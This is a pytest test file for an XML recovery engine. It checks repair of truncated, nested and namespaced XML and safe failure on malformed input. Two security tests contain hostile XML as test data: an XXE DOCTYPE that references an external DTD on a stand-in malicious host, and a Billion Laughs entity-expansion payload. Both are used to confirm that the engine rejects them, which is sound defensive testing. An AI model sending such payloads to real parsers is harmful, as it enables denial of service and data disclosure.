"""
tests/test_xml_recovery.py — Comprehensive tests for Phase 2 XML recovery engine.

Tests:
  - Intact XML documents
  - Truncated XML with missing parent/root closing tags
  - Deeply nested element closure
  - Incomplete trailing tag / attribute truncation handling
  - Namespace preservation
  - Malformed/mismatched tags (safe failure)
  - Truncation before root tag (safe failure)
  - Security: Billion Laughs entity expansion rejection
  - Security: XXE external entity reference rejection
  - End-to-end API upload and download of recovered XML
"""

import pytest
from fastapi.testclient import TestClient

from backend.app.main import app
from backend.app.recovery.reconstruction import reconstruct_artifact
from backend.app.recovery.validators.xml import validate_xml


client = TestClient(app)


def test_xml_intact_document():
    payload = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<catalog id="cat-1">\n'
        b'  <book id="bk101">\n'
        b'    <author>Gambardella, Matthew</author>\n'
        b'    <title>XML Developer\'s Guide</title>\n'
        b'  </book>\n'
        b'</catalog>\n'
    )
    res = reconstruct_artifact("xml", payload)
    assert res.status == "FULLY_RECOVERED"
    assert res.success is True
    assert res.verified_bytes == len(payload)
    assert res.reconstructed_bytes == 0
    assert res.missing_bytes == 0
    assert res.recovered_bytes == payload
    val = validate_xml(res.recovered_bytes)
    assert val.valid is True
    assert val.details.get("root_tag") == "catalog"


def test_xml_truncated_missing_root_closer():
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<notes>\n'
        b'  <note id="1"><message>Meeting at 10</message></note>\n'
        b'  <note id="2"><message>Deploy at 14</message></note>\n'
    )
    res = reconstruct_artifact("xml", payload)
    assert res.status == "PARTIALLY_RECOVERED"
    assert res.success is True
    assert res.reconstructed_bytes == len(b"</notes>")
    assert res.missing_bytes == 0
    assert res.recovered_bytes.endswith(b"</notes>")
    val = validate_xml(res.recovered_bytes)
    assert val.valid is True
    assert val.details.get("child_count") == 2


def test_xml_deeply_nested_truncation():
    payload = (
        b'<company name="Acme">\n'
        b'  <division name="Engineering">\n'
        b'    <team name="Platform">\n'
        b'      <member role="Lead">Alice</member>\n'
    )
    res = reconstruct_artifact("xml", payload)
    assert res.status == "PARTIALLY_RECOVERED"
    assert res.success is True
    # Must close team, division, company in reverse order
    assert res.recovered_bytes.endswith(b"</team></division></company>")
    val = validate_xml(res.recovered_bytes)
    assert val.valid is True
    assert val.details.get("root_tag") == "company"


def test_xml_incomplete_trailing_element_dropped():
    # Cut off midway through a start tag: <member role="
    payload = (
        b'<company name="Acme">\n'
        b'  <team name="Platform">\n'
        b'    <member>Alice</member>\n'
        b'    <member role="'
    )
    res = reconstruct_artifact("xml", payload)
    assert res.status == "PARTIALLY_RECOVERED"
    assert res.success is True
    assert res.missing_bytes == len(b'<member role="')
    assert b'<member role="' not in res.recovered_bytes
    assert res.recovered_bytes.endswith(b"</team></company>")
    val = validate_xml(res.recovered_bytes)
    assert val.valid is True


def test_xml_namespace_preservation():
    payload = (
        b'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
        b'  <soap:Body>\n'
        b'    <m:GetStockPrice xmlns:m="http://example.com/stock">\n'
        b'      <m:StockName>ACME</m:StockName>\n'
        b'    </m:GetStockPrice>\n'
    )
    res = reconstruct_artifact("xml", payload)
    assert res.status == "PARTIALLY_RECOVERED"
    assert res.success is True
    assert res.recovered_bytes.endswith(b"</soap:Body></soap:Envelope>")
    val = validate_xml(res.recovered_bytes)
    assert val.valid is True


def test_xml_malformed_mismatched_tags_unrecoverable():
    payload = b"<root><open>data</different_close></root>"
    res = reconstruct_artifact("xml", payload)
    assert res.status == "UNRECOVERABLE"
    assert res.success is False
    assert res.verified_bytes == 0


def test_xml_truncated_before_root_opened_unrecoverable():
    payload = b'<?xml version="1.0" encoding="UTF-8"?>\n<!-- just a comment -->'
    res = reconstruct_artifact("xml", payload)
    assert res.status == "UNRECOVERABLE"
    assert res.success is False


def test_xml_security_xxe_rejection():
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE foo SYSTEM "http://malicious.example.com/evil.dtd">\n'
        b'<foo>bar</foo>'
    )
    res = reconstruct_artifact("xml", payload)
    assert res.status == "UNRECOVERABLE"
    assert res.success is False
    assert "XXE" in res.details.get("error", "")


def test_xml_security_billion_laughs_rejection():
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE lolz [\n'
        b' <!ENTITY lol "lol">\n'
        b' <!ENTITY lol1 "&lol;&lol;&lol;">\n'
        b' <!ENTITY lol2 "&lol1;&lol1;&lol1;">\n'
        b' <!ENTITY lol3 "&lol2;&lol2;&lol2;">\n'
        b']>\n'
        b'<lolz>&lol3;</lolz>'
    )
    res = reconstruct_artifact("xml", payload)
    assert res.status == "UNRECOVERABLE"
    assert res.success is False
    assert "Entity expansion" in res.details.get("error", "")


def test_xml_api_upload_and_download(tmp_path):
    # Test end-to-end API upload of truncated XML
    content = b'<audit_log><entry id="1"><event>LOGIN</event></entry>'
    files = {"file": ("damaged_log.xml", content, "application/xml")}
    response = client.post("/api/recover-file", files=files)
    assert response.status_code == 200
    data = response.json()

    assert data["format"] == "xml"
    assert data["status"] == "PARTIALLY_RECOVERED"
    assert data["is_downloadable"] is True
    assert data["reconstructed_bytes"] == len(b"</audit_log>")

    # Test download
    dl_url = data["download_url"]
    dl_response = client.get(dl_url)
    assert dl_response.status_code == 200
    assert dl_response.content == b'<audit_log><entry id="1"><event>LOGIN</event></entry></audit_log>'
